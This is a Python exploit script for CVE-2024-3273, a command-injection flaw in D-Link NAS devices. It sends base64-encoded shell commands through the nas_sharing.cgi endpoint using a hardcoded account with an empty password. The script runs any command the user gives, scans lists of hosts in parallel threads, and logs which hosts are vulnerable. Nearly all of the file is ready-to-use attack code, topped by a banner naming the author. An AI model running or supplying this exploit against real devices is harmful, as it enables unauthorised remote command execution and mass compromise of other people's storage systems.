import argparse
import base64
import concurrent.futures
import os
import requests
from sys import stdout
from colorama import Fore, init
from urllib.parse import urlparse

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def banners():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write(""+Fore.LIGHTRED_EX +" ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗     ██████╗ ██████╗ ███████╗██████╗ \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║     ╚════██╗╚════██╗╚════██║╚════██╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗█████╔╝ █████╔╝    ██╔╝ █████╔╝\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝╚═══██╗██╔═══╝    ██╔╝  ╚═══██╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║     ██████╔╝███████╗   ██║  ██████╔╝\n")
    stdout.write(""+Fore.LIGHTRED_EX +" ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝     ╚═════╝ ╚══════╝   ╚═╝  ╚═════╝ \n")
    stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦══════════════════════════════\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI MALAM                                    "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/THATNOTEASY                        "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n") 
    print(f"{Fore.YELLOW}[CVE-2024-3273] - {Fore.GREEN}D-Link NAS devices execute arbitrary commands\n")
banners()

init(autoreset=True)

session = requests.Session()
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.1.153 Yowser/2.5 Safari/537.36","Accept-Encoding": "identity"}

def encode_base64(command):
    return base64.b64encode(command.encode()).decode()

def execute_command(host, command=None, output_file=None):
    if command is None:
        command = 'id'
    encoded_command = encode_base64(command)
    url = f"{host}/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system={encoded_command}"

    try:
        response = session.get(url, headers=headers, timeout=5)
        if response.status_code == 200:
            if 'root' in response.text:
                print(f"{Fore.YELLOW}[CVE-2024-3273] {Fore.RED}- {Fore.WHITE}{host} {Fore.RED}- {Fore.GREEN}commands: {Fore.WHITE}{command} {Fore.RED}- {Fore.GREEN}[w00t!]")
                if output_file:
                    with open(os.path.join("Results", output_file), 'a') as f:
                        f.write("[+] VULNERABLE: " + host + '\n')
            else:
                print(f"{Fore.YELLOW}[CVE-2024-3273] {Fore.RED}- {Fore.WHITE}{host} {Fore.RED}- {Fore.GREEN}commands: {Fore.WHITE}{command} {Fore.RED}- {Fore.GREEN}Response: \n" + response.text)
        elif response.status_code == 401:
            print(f"{Fore.YELLOW}[CVE-2024-3273] {Fore.RED}- {Fore.WHITE}{host} {Fore.RED}- {Fore.GREEN}commands: {Fore.WHITE}{command} {Fore.RED}- {Fore.RED}[Failed!]")
        elif response.status_code == 404:
            print(f"{Fore.YELLOW}[CVE-2024-3273] {Fore.RED}- {Fore.WHITE}{host} {Fore.RED}- {Fore.GREEN}commands: {Fore.WHITE}{command} {Fore.RED}- {Fore.RED}[Failed!]")
        else:
            print(f"{Fore.YELLOW}[CVE-2024-3273] {Fore.RED}- {Fore.WHITE}{host} {Fore.RED}- {Fore.GREEN}commands: {Fore.WHITE}{command} {Fore.RED}- {Fore.GREEN}Response: \n" + response.text)
    except requests.Timeout:
        print(f"{Fore.YELLOW}[CVE-2024-3273] {Fore.RED}- {Fore.WHITE}{host} {Fore.RED}- Request timed out.")
    except requests.ConnectionError as e:
        print(f"{Fore.YELLOW}[CVE-2024-3273] {Fore.RED}- {Fore.WHITE}{host} {Fore.RED}- Connection error.")
    except Exception as e:
        print(f"{Fore.YELLOW}[CVE-2024-3273] {Fore.RED}- {Fore.WHITE}{host} {Fore.RED}- An error occurred.")

def execute_command_multiple(file_path, output_file=None):
    with open(file_path, 'r') as file:
        hosts = [line.strip().replace("\ufeff", "") for line in file]

    with concurrent.futures.ThreadPoolExecutor() as executor:
        for host in hosts:
            if not urlparse(host).scheme:
                host = 'http://' + host

            executor.submit(execute_command, host, output_file=output_file)
            
def main():
    parser = argparse.ArgumentParser(description='Run commands on hosts.')
    parser.add_argument('-u', '--url', help='URL/IP of the host')
    parser.add_argument('-f', '--filename', help='Path to the file containing hosts')
    parser.add_argument('-o', '--output', help='Path to save vulnerable hosts only')
    parser.add_argument('-t', '--thread', type=int, default=5, help='Number of threads')
    parser.add_argument('-c', '--command', default='id', help='Command to run (default: id)')
    args = parser.parse_args()

    if args.url:
        execute_command(args.url, args.command, output_file=args.output)
    elif args.filename:
        execute_command_multiple(args.filename, args.output)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()